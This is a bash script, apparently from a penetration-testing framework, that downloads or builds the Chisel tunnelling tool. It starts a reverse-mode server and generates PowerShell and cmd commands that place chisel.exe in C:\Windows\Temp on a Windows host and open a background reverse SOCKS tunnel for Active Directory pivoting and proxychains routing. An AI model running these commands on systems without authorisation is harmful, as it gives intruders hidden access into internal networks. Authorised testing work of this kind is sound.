#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
source $SCRIPTDIR/network.sh

get_chisel() {
    local chisel_file=$1
    if [[ -z "$chisel_file" ]]; then
        chisel_file="windows_amd64"        
    fi
    local chisel_url="https://github.com/jpillora/chisel/releases/expanded_assets/v1.10.1"
    local chisel_assets=$(curl -s $chisel_url | grep -oP 'href="\K[^"]+')    
    while read -r line ; do
        if [[ $line == *$chisel_file* && $line == *gz* ]] ; then            
            wget -q https://github.com$line -O "chisel_$chisel_file"'.gz'
            gunzip "chisel_$chisel_file"'.gz'
            if [[ $chisel_file == "windows"* ]] ; then
                mv "chisel_$chisel_file" chisel.exe
            else
                mv "chisel_$chisel_file" chisel
                chmod +x chisel
            fi
        fi
    done <<< "$chisel_assets"
}

compile_chisel() {
    local go_version=$1
    if [[ -z "$go_version" ]]; then
        go_version="1.19" 
    fi
    local chisel_version=$2
    if [[ -z "$chisel_version" ]]; then
        chisel_version="1.10.1"
    fi
    local chisel_file="chisel"
    local main_file="main"
    if [[ ! -z "$chisel_windows" ]] && [[ "$chisel_windows" == "true" ]] ; then
        env_options="-e GOOS=windows -e GOARCH=amd64"
        main_file="main.exe"
        chisel_file="chisel.exe"
    fi
    if [[ -f "$chisel_file" ]]; then
        echo "Chisel binary already exists, skipping compilation."
        return 1
    fi
    local chisel_src="https://github.com/jpillora/chisel/archive/refs/tags/v$chisel_version.tar.gz"
    if [[ ! -f "chisel.tar.gz" ]]; then
        wget -q $chisel_src -O chisel.tar.gz
        tar xvf chisel.tar.gz
        sed -i 's/0\.0\.0-src/'$chisel_version'/g' chisel-$chisel_version/share/version.go
    fi
    docker run -it --rm -v $(pwd)/chisel-$chisel_version:/opt/chisel -w /opt/chisel $env_options golang:$go_version go build main.go
    cp chisel-$chisel_version/$main_file $chisel_file
}

start_chisel_server() {
    if [ ! -f "chisel" ]; then
        echo "Chisel binary not found. Please compile or download it first."
        return 1
    fi
    if [[ ! -z "$1" ]]; then
        chisel_server_ip=$1
    fi
    if [ -z "$chisel_server_port" ]; then
        chisel_server_port=443
    fi
    if [ -z "$chisel_server_ip" ]; then
        chisel_server_ip=$(get_host_ip)
    fi
    if [ -z "$chisel_server_options" ]; then
        chisel_server_options="--reverse"
    fi
    if pgrep -f "chisel server"; then
        echo "Chisel server is already running."
        return 0
    fi
    echo "Starting Chisel server on port $chisel_server_port... with $chisel_server_options"
    ./chisel server --port $chisel_server_port $chisel_server_options 2>&1 | tee -a $log_dir/chisel.log &
}


stop_chisel_server() {
    if pgrep -f "chisel server"; then
        echo "Stopping Chisel server..."
        pkill -f "chisel server"
    else
        echo "No Chisel server is running."
    fi
}

get_kill_chisel_command(){
    local cmd=""
    if [[ ! -z "$chisel_windows" ]] && [[ "$chisel_windows" == "true" ]] ; then
        cmd="Get-Process -Name chisel.exe | Stop-Process -Force;"
    else
        cmd="pkill -f 'chisel client'; pkill -f 'chisel server'"
    fi
    echo "$cmd"
}

get_chisel_server_command() {
    if [[ -z $chisel_windows_folder_path ]]; then
        chisel_windows_folder_path='C:\Windows\Temp\'
    fi
    local chisel_file="chisel"
    if [[ ! -z "$chisel_windows" ]] && [[ "$chisel_windows" == "true" ]] ; then
        chisel_file=$chisel_windows_folder_path'chisel.exe'
        generate_windows_download "chisel.exe" "$chisel_file"
        if [[ -z $chisel_powershell ]]; then
            chisel_powershell=true
        fi
    else
        chisel_file="./"$chisel_file
    fi
    if [ -z "$chisel_server_options" ]; then
        chisel_server_options="--reverse"
    fi
    if [[ -z $chisel_background ]]; then
        chisel_background=true
    fi   
    if [[ ! -z "$chisel_background" ]] && [[ "$chisel_background" == "true" ]] ; then
        if [[ ! -z "$chisel_powershell" ]] && [[ "$chisel_powershell" == "true" ]] ; then
            echo 'Start-Process -FilePath "'$chisel_file'" -ArgumentList "server","--port","'$chisel_server_port'", "'$chisel_server_options'" -NoNewWindow -PassThru;'
            return 0
        elif [[ ! -z "$chisel_windows" ]] && [[ "$chisel_windows" == "true" ]] ; then
            echo "cmd /c 'start /b  $chisel_file server --port $chisel_server_port $chisel_server_options';"
            return 0
        else
            chisel_server_options+=" &"
        fi
    fi
    echo $chisel_file server --port $chisel_server_port $chisel_server_options 

}


get_chisel_client_commands() {
    local chisel_client_options=$1
    if [ ! -z "$chisel_client_options" ]; then
        chisel_client_options+=" "
    fi
    local chisel_file="chisel"
    if [[ -z $chisel_windows_folder_path ]]; then
        chisel_windows_folder_path='C:\Windows\Temp\'
    fi
    if [[ ! -z "$chisel_windows" ]] && [[ "$chisel_windows" == "true" ]] ; then
        chisel_file=$chisel_windows_folder_path'chisel.exe'
        generate_windows_download "chisel.exe" "$chisel_file"
        if [[ -z $chisel_powershell ]]; then
            chisel_powershell=true
        fi
    else
        chisel_file="./"$chisel_file        
    fi
    if [[ -z "$chisel_server_ip" ]]; then
        if pgrep -f "chisel server" > /dev/null; then
            chisel_server_ip=$(get_host_ip)
        else
            echo "Chisel server is not running. Please start it first."
            return 1
        fi
    fi
    if [ -z "$chisel_server_port" ]; then
        chisel_server_port=$(ps -ef | grep "chisel server" | grep -v grep | grep -oP ' --port \K[0-9]+' )
        if [ -z "$chisel_server_port" ]; then
            echo "Chisel server port is not set. Please start the server first."
            return 1
        fi
    fi
    if pgrep -f "chisel server .*reverse" > /dev/null; then
        chisel_client_options+="R:"
    else
        chisel_client_options+=""
    fi
    if [ -z "$chisel_local_interface" ]; then
        chisel_local_interface=127.0.0.1
    fi
    chisel_client_options+="$chisel_local_interface"':'
    if [ -z "$chisel_local_port" ]; then
        chisel_local_port=1080        
    fi
    chisel_client_options+="$chisel_local_port:"
    if [ ! -z "$chisel_remote_host" ]; then
        chisel_client_options+="$chisel_remote_host:"
    fi
    if [ ! -z "$chisel_remote_port" ]; then
        chisel_client_options+="$chisel_remote_port"
    fi
    if [ -z "$chisel_remote_host" ]; then
        chisel_client_options+="socks"
    fi
    if [ -z "$chisel_client_protocol" ]; then
        chisel_client_protocol="tcp"
    fi
    if [[ "$chisel_client_options" != *socks* ]]; then    
        chisel_client_options+="/$chisel_client_protocol"
    fi
    if [[ -z $chisel_background ]]; then
        chisel_background=true
    fi

    if [[ ! -z "$chisel_background" ]] && [[ "$chisel_background" == "true" ]] ; then
        if [[ ! -z "$chisel_powershell" ]] && [[ "$chisel_powershell" == "true" ]] ; then
            echo 'Start-Process -FilePath "'$chisel_file'" -ArgumentList "client", "'$chisel_server_ip':'$chisel_server_port'", "'$chisel_client_options'" -NoNewWindow -PassThru;'
            return 0
        elif [[ ! -z "$chisel_windows" ]] && [[ "$chisel_windows" == "true" ]] ; then
            echo "cmd /c 'start /b  $chisel_file client $chisel_server_ip:$chisel_server_port $chisel_client_options';"
            return 0
        else
            chisel_client_options+=" &"
        fi
    fi
    echo "$chisel_file client $chisel_server_ip:$chisel_server_port $chisel_client_options" >> $log_dir/chisel.log
    echo "$chisel_file client $chisel_server_ip:$chisel_server_port $chisel_client_options"
}

wait_for_chisel_client_connect() {
    if [ -z "$chisel_local_port" ]; then
        chisel_local_port=1080
    fi
    local timeout=$1
    if [ -z "$timeout" ]; then
        timeout=30
    fi
    echo "Waiting for Chisel client to connect..."
    local end_time=$((SECONDS + timeout))
    while [ $SECONDS -lt $end_time ]; do
        if ss -ntplu | grep -q ":$chisel_local_port"; then
            ss -ntplu | grep ":$chisel_local_port"
            return 0
        fi
        sleep 1
    done
    echo "Chisel client did not connect within $timeout seconds."
    return 1
}

is_chisel_client_connected() {
    if [ -z "$chisel_local_port" ]; then
        chisel_local_port=1080
    fi
    if ss -ntplu | grep -q ":$chisel_local_port"; then
        echo "Chisel client is connected on port $chisel_local_port."
        return 0
    else
        echo "Chisel client is not connected on port $chisel_local_port."
        return 1
    fi
}

configure_proxychains() {
    if [[ ! -z "$1" ]]; then
        proxy_target=$1
    fi
    if [[ -z "$proxy_target" ]]; then
        echo "Proxy target must be set."
        return 1
    fi
    if [[ ! -z "$2" ]]; then
        proxy_port=$2
    fi
    if [[ -z "$proxy_port" ]]; then
        echo "Proxy port must be set."
        return 1
    fi

    configured=$(cat /etc/proxychains4.conf | grep socks5 | grep "$proxy_target" | grep "$proxy_port") 
    if [[ -z "$configured" ]]; then
        sudo sed -i -E '/^socks.*/d' /etc/proxychains4.conf
        sudo sed -i -E '/^http.*/d' /etc/proxychains4.conf
        echo "Configuring proxychains for $proxy_target:$proxy_port"
        echo "socks5 $proxy_target $proxy_port" | sudo tee -a /etc/proxychains4.conf > /dev/null
    else
        echo "Proxychains already configured for $proxy_target:$proxy_port"
    fi
}

configure_proxychains_chisel() {
    if is_chisel_client_connected; then
        configure_proxychains "$chisel_local_interface" "$chisel_local_port"
        use_proxychain=true
    fi
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    
    if [[ "$1" == "get_chisel" ]]; then
        get_chisel "$2"
        exit 0
    elif [[ "$1" == "compile_chisel" ]]; then
        compile_chisel "$2" "$3"
        exit 0
    elif [[ "$1" == "start_chisel_server" ]]; then
        start_chisel_server "$2"
        exit 0
    elif [[ "$1" == "stop_chisel_server" ]]; then
        stop_chisel_server
        exit 0
    elif [[ "$1" == "get_chisel_client_commands" ]]; then
        get_chisel_client_commands "$2"
        exit 0
    fi
    echo "Usage: $0 {get_chisel|compile_chisel [go_version] [chisel_version]|start_chisel_server [port]|stop_chisel_server}"
fi

configure_chisel_for_ad_pivot() {
    compile_chisel >> $log_dir/chisel.log 2>&1
    chisel_windows=true
    compile_chisel >> $log_dir/chisel.log 2>&1
    start_chisel_server >> $log_dir/chisel.log 2>&1
    get_chisel_client_commands
    chisel_client_command=$(get_chisel_client_commands)
    configure_proxychains_chisel
}

configure_chisel_for_local_http(){
    if [[ ! -z $1 ]]; then
        chisel_server_ip=$1
    fi
    compile_chisel >> $log_dir/chisel.log 2>&1
    chisel_windows=true
    compile_chisel >> $log_dir/chisel.log 2>&1
    get_chisel_server_command
    chisel_server_command=$(get_chisel_server_command)
    chisel_windows=false
    chisel_powershell=false
    chisel_remote_host=$http_ip
    chisel_remote_port=$http_port
    get_chisel_client_commands
    chisel_client_command=$(get_chisel_client_commands)
    if is_chisel_client_running; then
        echo "Chisel client for http is already running, skipping start"
    else
        echo "Starting Chisel client for http with $chisel_client_command"
        eval $chisel_client_command >> $log_dir/chisel.log 2>&1
    fi
    configure_http_to_use_chisel
}

is_chisel_client_running() {
    if pgrep -f "chisel client $chisel_server_ip:$chisel_server_port.*$chisel_local_interface:$chisel_local_port" > /dev/null; then
        echo "Chisel client is running."
        return 0
    else
        echo "Chisel client is not running."
        return 1
    fi

}

is_chisel_http_connected() {    
    #echo 'ss -ntp | grep -E -q "'$chisel_server_ip'\\]{0,1}:'$chisel_server_port'.*chisel"'
    if ss -ntp | grep -q -E "$chisel_server_ip\\]{0,1}:$chisel_server_port.*chisel"; then
        echo "Chisel client for http is connected $chisel_server_ip:$chisel_server_port."
        return 0
    else
        echo "Chisel client for http is not connected on port $chisel_server_ip:$chisel_server_port."
        return 1
    fi
}

configure_http_to_use_chisel() {
    if is_chisel_http_connected; then
        echo "Chisel client for http is already connected, skipping http configuration"
        http_port=$chisel_local_port
        http_ip=$chisel_local_interface
        echo "All downloads will use http://$http_ip:$http_port"        
    fi

}

configure_shell_for_chisel() {
    chisel_local_port=$host_port
    chisel_remote_port=$host_port
    get_chisel_client_commands
    chisel_client_command=$(get_chisel_client_commands)
    if is_chisel_client_running; then
        echo "Chisel client $chisel_client_command is already running, skipping start"
    else
        eval $chisel_client_command >> $log_dir/chisel.log 2>&1
    fi
    host_ip=$chisel_local_interface
}